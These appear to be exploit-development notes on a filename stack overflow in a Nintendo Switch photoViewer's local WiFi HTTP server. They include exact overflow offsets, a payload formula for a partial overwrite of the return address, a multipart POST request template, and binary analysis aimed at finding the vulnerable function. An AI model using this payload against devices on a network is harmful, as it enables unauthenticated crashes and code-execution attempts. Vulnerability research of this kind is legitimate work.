# photoViewer "Send to Smartphone" Multipart Filename Overflow

**Binary**: `photoViewer_20.0.0/main.flat.bin` (9.7 MB, ARM64)  
**SHA-256**: `9b48bcc404c0350e13b07e1c162b084a2145a093c25d2c1610df84a48e0546ff`  
**Base address**: `0x7100000000`  
**Hardware**: HAC-001, Tegra X1 Erista, Serial XAW4 001878  
**Firmware**: 22.5.0  
**Date**: 2026-11-25  

---

## 1. Vulnerability Summary

The "Send to Smartphone" feature in photoViewer hosts an HTTP server on 192.168.0.1:80 over local WiFi. Sending a POST with a multipart `Content-Disposition: form-data; filename="..."` header containing an oversized filename causes a stack buffer overflow that corrupts saved FP and LR, giving control of the program counter.

**Severity**: High (arbitrary code execution potential, requires local WiFi proximity)  
**Attack surface**: WiFi (LP2P local play), no authentication required  
**Trigger**: POST with multipart body, oversized filename field  

---

## 2. Confirmed Exploit Parameters

All values confirmed empirically on live hardware with multiple test runs.

| Parameter | Value | Evidence |
|-----------|-------|----------|
| Buffer capacity | ~3972 bytes | Largest filename that doesn't crash |
| Crash boundary (0x41 fill) | 3973 bytes | First byte that crashes with non-null fill |
| Crash boundary (0x00 fill) | 3973 bytes | NULL also crashes at 3973 (1 byte of local var) |
| Saved FP offset | Byte 3973 | FP=0x00 survives, FP=0x41 crashes |
| Saved LR offset | Byte 3981 | 8 bytes after FP |
| Local var gap | 1 byte at offset 3972 | Must be 0x00 to avoid early crash |
| LR control | CONFIRMED | 2-byte partial overwrite tested |

### Stack Layout (from overflow perspective)

```
Offset 0      ... 3971:  Buffer (3972 bytes, tolerates any fill)
Offset 3972:              Local variable (1 byte, must be 0x00)
Offset 3973   ... 3980:  Saved FP (8 bytes)
Offset 3981   ... 3988:  Saved LR (8 bytes)
```

### 2-Byte Partial LR Overwrite Formula

```python
filename = b'\x41' * 3972 + b'\x00' + b'\x00' * 8 + LR_LOW_2_BYTES
# Total: 3983 bytes
```

This overwrites the low 2 bytes of saved LR while preserving the ASLR slide in the upper bytes, giving a deterministic redirect within a 64KB window around the original return address.

### Test Script Template

```python
boundary = b'----TestBoundary9876'
body = (b'------TestBoundary9876\r\n'
        b'Content-Disposition: form-data; name="file"; filename="'
        + filename_bytes + b'"\r\n'
        b'Content-Type: application/octet-stream\r\n\r\n'
        b'TESTDATA\r\n'
        b'------TestBoundary9876--\r\n')
req = (b'POST / HTTP/1.1\r\n'
       b'Host: 192.168.0.1\r\n'
       b'Content-Type: multipart/form-data; boundary=----TestBoundary9876\r\n'
       b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
       b'\r\n' + body)
```

**Networking requirements**: `SO_BINDTODEVICE` to `wlp5s0`, connect to `192.168.0.1:80`.

---

## 3. HTTP Server Architecture (Binary Analysis)

### Call Chain (confirmed by disassembly)

```
FUN_71006a0cf0  — HTTP server handler (M=3888)
  └→ FUN_71006a7ef0  — Multipart stream handler (M=4768)
       ├→ vtable[4] @ 0x71006a9ca4  — Read body callback
       │    Reads body data into 4096-byte buffer at SP+0x280
       └→ vtable[6] @ 0x71006a9cb0  — Header parser (M=528)
            └→ BLR dispatches to APPLICATION CALLBACK vtable
                 └→ FUN_71005f27f0 (vtable[6]) — POST handler (M=8352)
                      └→ callees (various)
```

### Key Data Structures

**Multipart parser vtable** at `0x71008FE640` (20 entries):

| Slot | Address | Role |
|------|---------|------|
| [0] | 0x71006a9b9c | Init/setup |
| [4] | 0x71006a9ca4 | Read body (buffer + size) |
| [6] | 0x71006a9cb0 | Header parser |
| [7-8] | NULL | Unused |

**Application callback vtable** (base) at `0x71008f1ac8` (20 entries):

| Slot | Address | M (locals) | Notes |
|------|---------|-----------|-------|
| [0] | 0x71005f002c | 0 | Stub |
| [1] | 0x71005f0034 | 0 | Stub |
| [2] | 0x71005f003c | 0 | Stub (RET) |
| [3] | 0x71005f0040 | 1168 | Too small |
| [4] | 0x71005f2180 | 416 | Too small |
| [5] | 0x71005f2750 | 0 | Small dispatcher |
| [6] | 0x71005f27f0 | 8352 | POST handler (RULED OUT — memmove clamped) |
| [7] | 0x71005f4e90 | 160 | Too small |
| [8] | 0x71005f5998 | 0 | Stub |
| [9] | 0x71005f5a00 | 80 | Too small |
| [10] | 0x710069dfc0 | 0 | HTTP range, small frame |
| [11] | 0x71005f5c10 | 32 | Too small |
| [12] | 0x71005f5cc0 | 0 | Stub |
| [13] | 0x71006c79e0 | 192 | Too small |
| [14] | 0x71005f6160 | 0 | Stub |
| [15] | 0x71005f6260 | 64 | Too small |
| [16-19] | various | 0 | Stubs |

**Application callback vtable** (derived) at `0x71008f3b58` (20 entries):

| Slot | Address | M (locals) | Notes |
|------|---------|-----------|-------|
| [6] | 0x7100622ce0 | 6336 | UI scene (ScenePvrEditScreenShot, RULED OUT) |
| [8] | 0x710069dc50 | 0 | HTTP range, small |
| [9] | 0x710069dcc0 | 0 | Small |
| All others | various | <400 | Too small |

### Key Strings in Binary

| Address | String | Usage |
|---------|--------|-------|
| 0x71006ef8f9 | `; filename="` | Multipart filename extraction |
| 0x71006f19be | `*name="(.*?)"(?:;\s*filename="(.*?)")?\s*$` | Regex for filename parsing |

---

## 4. Ruled-Out Candidates

Functions investigated and eliminated as the direct overflow site:

| Function | M (locals) | Reason Ruled Out |
|----------|-----------|-----------------|
| FUN_71006a0cf0 | 3888 | M < 3973 (too small to reach FP) |
| FUN_71006a7ef0 | 4768 | 4096B buffer at SP+0x280, 128B gap to FP, no memmove in function |
| FUN_71006a9cb0 | 528 | Header parser, far too small |
| FUN_71005f27f0 | 8352 | Memmove clamped to 4095, dest from CSEL not SP, buffer 2676B from FP |
| FUN_71005fd930 | 16736 | Huge frame but only uses SP+0x148 max |
| FUN_7100693e64 | 6288 | UTF-16 ushort processing, all 3 memmove bounded, NO CALLERS found |
| FUN_71005f2750 | 0 | Too small, just vtable dispatcher |
| FUN_71005f0040 | 1168 | Too small |
| FUN_7100622ce0 | 6336 | UI scene setup, wrong context |
| FUN_7100398988 | — | Client-side libcurl, wrong binary role |
| All 22 direct callees of 0x6a0cf0 | <3973 | None have M >= 3973 |
| All 17 BL targets of header parser | <3973 | None have M >= 3973 |
| All direct BL callees of 0x5f27f0 | <3973 | Except 0x5fd930 (ruled out above) |

### Why This Is Hard

The overflow function has specific constraints:
1. **M >= 3973** (locals must be large enough for buffer + gap + FP/LR to match crash geometry)
2. **Must receive filename data** (either directly or through vtable dispatch chain)
3. **Must have an unbounded copy** to a stack buffer
4. **Must be reachable** from the HTTP POST handler through the multipart parsing chain

The multipart parser uses heavy vtable indirection (55+ BLR dispatches in the main handler alone). The filename data flows through:
- Multipart body read (vtable[4])
- Header parsing (vtable[6])
- Application callback dispatch (BLR through 0x71008f1ac8 vtable)
- Possibly deeper nested vtable dispatches

---

## 5. Remaining Investigation Leads

### High Priority

1. **vtable[4] = 0x71006a9ca4 (read body callback)**: This receives the SP+0x280 buffer with size 0x1000. It may have its OWN stack frame where it copies/processes data. Needs decompilation.

2. **Deep callees of FUN_71005f27f0**: The POST handler has ~40 BL targets. While none individually have M >= 3973, the overflow could be in a 3rd+ level callee that does have a large frame. Need recursive callee scan.

3. **Custom string class operations**: The binary uses a custom buffer class (vtable 0x7100900C50) with inline 4096-byte buffers. If a string assignment bypasses the capacity check, the inline buffer overflows into the frame.

4. **Regex capture result handling**: The filename regex at 0x71006f19be captures the filename. The captured group's string storage and subsequent copy is a prime overflow candidate. Need to trace the regex engine's output path.

### Medium Priority

5. **Other vtables in the multipart handler**: FUN_71006a7ef0 computes 9+ vtable addresses (via ADRP+ADD):
   - 0x71008fe688, 0x71008fde38, 0x71008fdea0, 0x71008fde68
   - 0x71008fe260, 0x71008fe230, 0x71008fdf00, 0x71008fdf30
   These inner vtable objects may dispatch to functions we haven't examined.

6. **FUN_710069b430 (M=8848)**: Has 0x1000 capacity setup at SP+0x280. Called from 0x710069c148 and 0x710069c234 — not directly in the HTTP chain via BL, but might be reachable through vtable dispatch.

7. **FUN_710069c2b0 (M=8336)**: Has 0x1000 capacity setup at SP+0x68. Called from 0x710065c528 — investigate reachability from HTTP handler.

### Lower Priority / Alternative Approaches

8. **Memmove callers in HTTP range (0x690000-0x6B0000)**: 17 total calls found. The 12 in small functions (M=0) are likely thunks. FUN_710069b430 has 2 calls (at 0x69b568, 0x69bc08) with register-based destinations.

9. **Global search for all functions with 3973 <= M <= 5000**: Narrow the search to functions whose frame size exactly matches the crash geometry. The vulnerable function likely has M in this range.

---

## 6. What We Know About the Vulnerable Function

Based on the crash geometry, the vulnerable function MUST have:

```
Buffer start:        SP + B
Buffer capacity:     >= 3972 bytes (but probably 4096 = 0x1000)
Local var at:        SP + B + 3972 (1 byte, non-zero crashes)
Saved FP at:         SP + M  (where M = B + 3973)
Saved LR at:         SP + M + 8

If buffer = 4096 bytes:
  B = M - 3973
  Gap between buffer end (SP+B+4096) and FP (SP+M) = 4096 - 3973 = 123 bytes
  These 123 bytes are other local variables between the buffer and saved regs.
  
  Plausible M values: 3973 + B, where B = offset of buffer start
  If B ~ 0x60-0x100 (96-256), then M ~ 4069-4229
  If B = 0 (buffer at bottom of frame), then M = 3973
```

The 1-byte local variable at offset 3972 that must be 0x00 is likely a null terminator or a flag/counter that the code checks before the function returns.

---

## 7. Evidence Files

All in `ldn_research/evidence/exploit_dev/`:

| File | Description |
|------|-------------|
| `exact_boundary_*.json` | Binary search pinning crash at 3972/3973 |
| `exploit_dev_*.json` | Initial overflow testing |
| `byte_control_*.json` | Byte-level control verification |
| `blind_exploit_*.json` | Blind exploitation probes |
| `lr_redirect_*.json` | LR overwrite confirmation |
| `lr_diagnostic_*.json` | LR diagnostic tests |
| `crash_response_*.json` | Response analysis during crashes |
| `multipart_leak_*.json` | Info leak probes |
| `http_info_leak_*.json` | HTTP info leak attempts |
| `timing_geometry_*.json` | Timing-based crash analysis |
| `anomaly_crossval_*.json` | Cross-validation of anomalies |
| `overflow_test_*.json` | Overflow boundary tests |
| `nocrash_test_*.json` | No-crash baseline verification |
| `dhcp_size_probe_*.json` | DHCP-related size probes |

---

## 8. Test Scripts

| Script | Purpose |
|--------|---------|
| `multipart_info_leak.py` | Probe for address leaks in HTTP responses near crash boundary |
| `multipart_exploit_probe.py` | Targeted tests: NULL/0x41 fill, FP/LR controlled overwrite |
| `multipart_fp_lr_find.py` | Precise FP/LR offset determination |

---

## 9. Operational Notes

- **Recovery is MANUAL**: After a crash, the user must restart the Switch into Send to Smartphone mode. Recovery times vary and do NOT indicate different crash behavior.
- **HTTP availability is an INDIRECT ORACLE**: Server becoming unreachable after a request is consistent with a crash but is not direct proof of a crash. It could also be a hang or connection reset.
- **Persistent DoS confirmed**: Crash is reproducible and consistent across 3+ test sessions.
- **SO_BINDTODEVICE required**: All sockets must bind to `wlp5s0` interface.
- **No firmware updates**: User is intentionally on older FW. Never suggest System Update.

---

## 10. Blockers and Next Steps

### Primary Blocker
**The specific vulnerable function has NOT been identified in the binary.**

We know:
- The overflow is real (confirmed by LR control)
- It happens during multipart filename processing
- The buffer is likely 4096 bytes (0x1000)
- None of the directly-examined functions in the vtable dispatch chain match the crash geometry

### Recommended Next Steps (in priority order)

1. **Search ALL functions in the binary with 3973 <= M <= 5000** and check which are reachable from the HTTP handler
2. **Decompile vtable[4] = 0x71006a9ca4** to see if it has its own large stack frame
3. **Trace the regex output path** from 0x71006f19be to find where the captured filename string is copied
4. **Scan the inner vtable addresses** (0x71008fde38, 0x71008fdea0, etc.) for large-frame targets
5. **Consider that the overflow may be through a libc++ string operation** (std::string::assign on a stack-allocated SSO string that uses a custom allocator with inline storage)
